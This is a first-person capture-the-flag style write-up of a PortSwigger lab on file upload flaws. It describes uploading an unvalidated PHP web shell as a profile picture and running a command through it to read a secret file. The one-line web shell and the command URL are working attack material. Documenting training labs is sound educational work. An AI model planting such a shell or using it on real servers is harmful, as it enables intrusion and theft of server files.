# Remote Code Execution via Web Shell Upload

**Lab:** PortSwigger Web Security Academy — File Upload Vulnerabilities (Apprentice)  
**Status:** Solved ✅

---

So I finally solved my first file upload vulnerability lab. Took me way longer than I expected, but honestly learned more from the struggle than I would have from breezing through it.

## Finding the Upload Point

I opened the lab and started looking for anywhere I could upload something. Found a comment section first and tried uploading a payload there — got a black screen and some invalid parameter error. Dead end.

Then I noticed the profile picture upload. Since the lab gave me credentials (`wiener:peter`), I logged in and went to the account page. That's where the actual vulnerable upload was sitting.

## Creating the Web Shell

Opened my terminal and created the PHP file:

```bash
nano portswiggerexploit.php
```

Pasted this payload inside:

```php
<?php echo system($_GET['command']); ?>
```

Saved it and uploaded it as a profile picture. No validation, no restrictions — it went through clean.

## Finding the File Path

After uploading, I checked Burp Suite's HTTP history. When a website accepts a profile picture, it has to serve that image back to you from somewhere — so the response tells you exactly where the file is stored on the server.

From the response I found the path:

```
/files/avatars/portswiggerexploit.php
```

## Executing the Shell

Now I could call the script directly in the browser. Built the URL:

```
https://<lab-id>.web-security-academy.net/files/avatars/portswiggerexploit.php?command=cat%20/home/carlos/secret
```

Quick note: `%20` is just URL-encoded space. I originally forgot the space between `cat` and the path, which caused it to fail for a bit.

## The Secret String Confusion

When the output came back, I saw this:

```
gHDlyXs1CifvIROj5Edbky7t0wjvAGqlgHDlyXs1CifvIROj5Edbky7t0wjvAGql
```

I spent almost an hour thinking this was some encoding — Base64 maybe, or hex. Tried decoding it every way I could think of. Nothing worked.

Then I looked closer. It was the same string twice, back to back. The browser was rendering the `system()` output doubled — once from the function return value and once from `echo`. The actual secret was just:

```
gHDlyXs1CifvIROj5Edbky7t0wjvAGql
```

Pasted that into the lab, and it was done.

## What I Learned

- If a server does zero validation on uploaded files, you can upload a PHP script and execute it directly — as long as the upload directory is inside the web root.
- HTTP history in Burp is useful not just for attacks but for reconnaissance — things like finding where uploaded files are served from.
- `system()` in PHP outputs the command result AND returns it, so using `echo system(...)` prints it twice. That's a quirk worth remembering.
- When you get a weird-looking output, check if it's literally just duplicated before spending an hour trying to decode it.

---

*Tags: file-upload, rce, php-webshell, portswigger, web-security-academy*
